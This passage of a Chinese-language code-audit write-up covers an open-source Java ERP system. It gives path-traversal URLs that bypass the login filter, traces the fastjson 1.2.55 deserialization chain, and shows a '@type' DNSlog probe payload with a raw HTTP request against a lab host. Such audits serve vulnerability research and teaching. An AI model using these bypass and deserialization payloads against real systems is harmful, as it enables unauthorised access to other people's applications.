servletResponse.sendRedirect(<span class="hljs-string">&quot;/login.html&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">regexPrefix</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;^.*&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">regexSuffix</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;.*$&quot;</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">verify</span><span class="hljs-params">(List&lt;String&gt; ignoredList, String url)</span> &#123;<br>        <span class="hljs-keyword">for</span> (String regex : ignoredList) &#123;<br>            <span class="hljs-type">Pattern</span> <span class="hljs-variable">pattern</span> <span class="hljs-operator">=</span> Pattern.compile(regexPrefix + regex + regexSuffix);<br>            <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> pattern.matcher(url);<br>            <span class="hljs-keyword">if</span> (matcher.matches()) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤逻辑：</p><ul><li>放行：<ul><li>Session 中有 user</li><li>访问 <code>/doc.html</code> <code>/register.html</code> <code>/login.html</code>   </li><li>ignoredList  静态资源</li><li>allowUrls     &#x2F;user&#x2F;login   &#x2F;user&#x2F;registerUser    &#x2F;v2&#x2F;api-docs</li></ul></li><li>其他全部重定向到 &#x2F;login.html</li><li>缺陷：<ul><li>虽然有白名单，但路径匹配不完整，如果在 url 中构建如：1.css&#x2F;..&#x2F;index.html  doc.html&#x2F;..&#x2F;index.html 等，就会绕过</li></ul></li></ul><p><strong>漏洞利用：</strong></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">/doc.html/../home.html<br>/register.html/../home.html<br>/login.html/../home.html<br>/1.css/../home.html<br>/user/login/../../home.html<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349294.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349044.png"></p><p><strong>注意：</strong></p><p>这抓包中有时会抓到这样一行数据： If-Modified-Since: Tue, 05 Jan 2021 22:51:28 GMT  </p><p>这是浏览器的本地缓存，如果这个资源自这个时间点之后没有修改，就返回304</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349541.png"></p><p>把这个去掉就可以正常注入了</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349763.png"></p><h2 id="2、pom-xml-Maven-依赖"><a href="#2、pom-xml-Maven-依赖" class="headerlink" title="2、pom.xml - Maven 依赖"></a>2、pom.xml - <strong>Maven 依赖</strong></h2><h3 id="2-1-fastjson-1-2-55-反序列化漏洞"><a href="#2-1-fastjson-1-2-55-反序列化漏洞" class="headerlink" title="2.1 fastjson-1.2.55-反序列化漏洞"></a>2.1 fastjson-1.2.55-反序列化漏洞</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349971.png"></p><p>入口点：parseObject</p><p>**全局搜索 parseObject **，找一个带有可控变量的点</p><p>找到 src&#x2F;main&#x2F;java&#x2F;com&#x2F;jsh&#x2F;erp&#x2F;utils&#x2F;StringUtil.java 中有利用点</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349969.png"></p><h4 id="分析链："><a href="#分析链：" class="headerlink" title="分析链："></a>分析链：</h4><hr><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">(String search, String key)</span>&#123;<br>    <span class="hljs-comment">//返回值初始化为空字符串</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-comment">//判断 search 是否为空</span><br>    <span class="hljs-keyword">if</span>(search!=<span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">//将 search 解析为 JSONObject</span><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSONObject.parseObject(search);<br>        <span class="hljs-comment">//从 JSONObject 取一个 key 并转化为 String</span><br>        value = obj.getString(key);<br>        <span class="hljs-comment">//如果取到空字符串，value = null;</span><br>        <span class="hljs-keyword">if</span>(value.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>            value = <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> value;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 <font style="color:#080808;background-color:#ffffff;">JSONObject.parseObject</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title function_">parseObject</span><span class="hljs-params">(String text)</span> &#123;<br><span class="hljs-comment">//调用了 parse 方法，把 text 解析成一个 Java 对象</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> parse(text);<br><span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> JSONObject) &#123;<br>    <span class="hljs-keyword">return</span> (JSONObject) obj;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 <font style="color:#080808;background-color:#ffffff;">parse(String text)</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(String text)</span> &#123;<br>    <span class="hljs-comment">//调用了另一个 parse</span><br>    <span class="hljs-keyword">return</span> parse(text, DEFAULT_PARSER_FEATURE);<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 <font style="color:#080808;background-color:#ffffff;">parse(String text, int features)</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(String text, <span class="hljs-type">int</span> features)</span> &#123;<br>    <span class="hljs-comment">//引入了 ParserConfig.getGlobalInstance() 方法</span><br>    <span class="hljs-keyword">return</span> parse(text, ParserConfig.getGlobalInstance(), features);<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 parse(String text, ParserConfig config, int features)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(String text, ParserConfig config, <span class="hljs-type">int</span> features)</span> &#123;<br>        <span class="hljs-keyword">if</span> (text == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-type">DefaultJSONParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultJSONParser</span>(text, config, features);<br>        <span class="hljs-comment">//解析 JSON</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> parser.parse();<br>        parser.handleResovleTask(value);<br>        parser.close();<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br></code></pre></td></tr></table></figure><p>跟进 <font style="color:#080808;background-color:#ffffff;">DefaultJSONParser</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">DefaultJSONParser</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String input, <span class="hljs-keyword">final</span> ParserConfig config, <span class="hljs-type">int</span> features)</span>&#123;<br>    <span class="hljs-comment">//创建 JSONScanner ，传给下一个核心构造器</span><br>    <span class="hljs-built_in">this</span>(input, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONScanner</span>(input, features), config);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">DefaultJSONParser</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object input, <span class="hljs-keyword">final</span> JSONLexer lexer, <span class="hljs-keyword">final</span> ParserConfig config)</span>&#123;<br>    <span class="hljs-comment">//lexer：词法分析器。</span><br>    <span class="hljs-built_in">this</span>.lexer = lexer;<br>    <span class="hljs-comment">//用户输入的 JSON 字符串</span><br>    <span class="hljs-built_in">this</span>.input = input;<br>    <span class="hljs-built_in">this</span>.config = config;<br>    <span class="hljs-built_in">this</span>.symbolTable = config.symbolTable;<br><br>    <span class="hljs-comment">//获取 JSON 输入的第一个字符，用于判断 JSON 的类型：&#123; 对象；[ 数组；其他（数字、字符串、布尔等）</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">ch</span> <span class="hljs-operator">=</span> lexer.getCurrent();<br>    <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;&#123;&#x27;</span>) &#123;<br>        lexer.next();<br>        ((JSONLexerBase) lexer).token = JSONToken.LBRACE;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<br>        lexer.next();<br>        ((JSONLexerBase) lexer).token = JSONToken.LBRACKET;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        lexer.nextToken(); <span class="hljs-comment">// prime the pump</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><strong><font style="color:rgb(34, 34, 38);">lexer（词法分析器）与 parser（语法分析器）</font></strong></p><p><a href="https://blog.csdn.net/buguge/article/details/147525215"><strong>https://blog.csdn.net/buguge/article/details/147525215</strong></a></p><p><strong><font style="color:rgb(77, 77, 77);">词法分析器(Lexer)和语法分析器(Parser)</font></strong><font style="color:rgb(77, 77, 77);">是两个核心组件，它们协同工作将原始输入(如JSON字符串、代码文件)转换为结构化数据(如对象、抽象语法树)</font></p></blockquote><p>返回一步，Object value &#x3D; parser.parse();   跟进 parse()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> parse(<span class="hljs-literal">null</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(Object fieldName)</span> &#123;<br><span class="hljs-keyword">final</span> <span class="hljs-type">JSONLexer</span> <span class="hljs-variable">lexer</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.lexer;<br><span class="hljs-keyword">switch</span> (lexer.token()) &#123;<br>    ...<br>    <span class="hljs-keyword">case</span> LBRACE:<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>(lexer.isEnabled(Feature.OrderedField));<br>        <span class="hljs-keyword">return</span> parseObject(object, fieldName);<br>    ...<br></code></pre></td></tr></table></figure><p>跟进 parseObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> Object <span class="hljs-title function_">parseObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Map object, Object fieldName)</span> &#123;<br></code></pre></td></tr></table></figure><p>在这个类中找我们需要的处理 @type 的部分，搜索  checkAutoType</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//JSON.DEFAULT_TYPE_KEY 即 @type</span><br><span class="hljs-keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">typeName</span> <span class="hljs-operator">=</span> lexer.scanSymbol(symbolTable, <span class="hljs-string">&#x27;&quot;&#x27;</span>);<br><br>    Class&lt;?&gt; clazz = config.checkAutoType(typeName, <span class="hljs-literal">null</span>, lexer.getFeatures());<br></code></pre></td></tr></table></figure><p>跟进 checkAutoType</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="hljs-type">int</span> features) &#123;<br></code></pre></td></tr></table></figure><p>来到这个类中，按照之前版本的经验，下一步有个 <font style="color:rgb(51, 51, 51);">TypeUtils.loadClass ，继续搜索</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (autoTypeSupport || expectClassFlag) &#123;<br>    <span class="hljs-type">long</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> h3;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>; i &lt; className.length(); ++i) &#123;<br>        hash ^= className.charAt(i);<br>        hash *= PRIME;<br>        <span class="hljs-keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> clazz;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="hljs-number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 TypeUtils.loadClass</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="hljs-type">boolean</span> cache) &#123;<br>    <span class="hljs-keyword">if</span>(className == <span class="hljs-literal">null</span> || className.length() == <span class="hljs-number">0</span> || className.length() &gt; <span class="hljs-number">128</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>下一步执行序列化和反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ObjectDeserializer</span> <span class="hljs-variable">deserializer</span> <span class="hljs-operator">=</span> config.getDeserializers().get(clazz);<br><span class="hljs-keyword">if</span>(deserializer != <span class="hljs-literal">null</span>)&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> JSON.toJSONString(object);<br>    <span class="hljs-keyword">return</span> (T) JSON.parseObject(json, clazz);<br>&#125;<br></code></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">在执行反序列化的过程中，调用实例化的类，执行后续命令</font></p><p><font style="color:rgb(51, 51, 51);"></font></p><p>接下来应该找<strong>调用 StringUtil#getInfo 方法</strong>的地方</p><p>看了参考文章找到 <font style="color:rgb(51, 51, 51);">UserComponent</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349681.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> List&lt;?&gt; getUserList(Map&lt;String, String&gt; map)<span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">//接收到前端传的 Map&lt;String,String&gt;，包含 search </span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">search</span> <span class="hljs-operator">=</span> map.get(Constants.SEARCH);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">userName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;userName&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">loginName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;loginName&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> QueryUtils.order(map);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> QueryUtils.filter(map);<br>    <span class="hljs-keyword">return</span> userService.select(userName, loginName, QueryUtils.offset(map), QueryUtils.rows(map));<br>&#125;<br></code></pre></td></tr></table></figure><p>找 getUserList 的调用地方，这时应该找的是控制器里的方法了</p><blockquote><p>几个踩坑的地方：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350863.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350926.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350041.png"></p><p>我们要注意，真正应该调用的是 <font style="color:#080808;background-color:#ffffff;">getUserList(Map&lt;String, String&gt; map)，而上面的都不是正确调用</font></p></blockquote><p>找到真正调用 <font style="color:#080808;background-color:#ffffff;">getUserList(Map&lt;String, String&gt; map) 的地方</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351643.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径变量 &#123;apiName&#125; </span><br><span class="hljs-meta">@GetMapping(value = &quot;/&#123;apiName&#125;/list&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getList</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;apiName&quot;)</span> String apiName,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.PAGE_SIZE, required = false)</span> Integer pageSize,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.CURRENT_PAGE, required = false)</span> Integer currentPage,</span><br><span class="hljs-params">                      //search 可传入 payload</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.SEARCH, required = false)</span> String search,</span><br><span class="hljs-params">                      HttpServletRequest request)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">//参数全部放入 Map，进行后续处理</span><br>    Map&lt;String, String&gt; parameterMap = ParamUtils.requestToMap(request);<br>    parameterMap.put(Constants.SEARCH, search);<br>    <span class="hljs-type">PageQueryInfo</span> <span class="hljs-variable">queryInfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageQueryInfo</span>();<br>    Map&lt;String, Object&gt; objectMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br></code></pre></td></tr></table></figure><hr><p><strong>小结利用链：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(value = &quot;/&#123;apiName&#125;/list&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getList</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;apiName&quot;)</span> String apiName,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.PAGE_SIZE, required = false)</span> Integer pageSize,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.CURRENT_PAGE, required = false)</span> Integer currentPage,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.SEARCH, required = false)</span> String search,</span><br><span class="hljs-params">                      HttpServletRequest request)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>-&gt;<br><span class="hljs-keyword">private</span> List&lt;?&gt; getUserList(Map&lt;String, String&gt; map)<span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">userName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;userName&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">loginName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;loginName&quot;</span>);<br>&#125;<br>-&gt;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">(String search, String key)</span>&#123;<br>-&gt;<br><span class="hljs-type">String</span> <span class="hljs-variable">userName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;userName&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">loginName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;loginName&quot;</span>);<br>-&gt;<br><span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSONObject.parseObject(search);<br>-&gt;<br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> parse(text);<br>-&gt;<br>turn <span class="hljs-title function_">parse</span><span class="hljs-params">(text, DEFAULT_PARSER_FEATURE)</span>;<br>-&gt;<br><span class="hljs-keyword">return</span> parse(text, ParserConfig.getGlobalInstance(), features);<br>-&gt;<br><span class="hljs-type">DefaultJSONParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultJSONParser</span>(text, config, features);<br><span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> parser.parse();<br>-&gt;<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> parse(<span class="hljs-literal">null</span>);<br>&#125;<br>-&gt;<br><span class="hljs-keyword">return</span> parseObject(object, fieldName);<br>-&gt;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> Object <span class="hljs-title function_">parseObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Map object, Object fieldName)</span> &#123;<br>-&gt;<br>Class&lt;?&gt; clazz = config.checkAutoType(typeName, <span class="hljs-literal">null</span>, lexer.getFeatures());<br>-&gt;<br><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="hljs-type">int</span> features) &#123;<br>-&gt;<br>clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="hljs-literal">true</span>);<br>-&gt;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="hljs-type">boolean</span> cache) <br>-&gt;<br><span class="hljs-type">ObjectDeserializer</span> <span class="hljs-variable">deserializer</span> <span class="hljs-operator">=</span> config.getDeserializers().get(clazz);<br><br></code></pre></td></tr></table></figure><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet4Address&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;xxx.dnslog.cn&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>@type：指定 fastjson 要实例化的类， val：这个类的某个字段值  </p><p><code>Inet4Address</code> 只能解析 IP&#x2F;域名，不能触发 LDAP 请求  </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">user/list?search=%7B%22%40type%22%3A%22java.net.Inet4Address%22%2C%22val%22%3A%22ccne35.dnslog.cn%22%7D</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.28.192.1:8123<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span 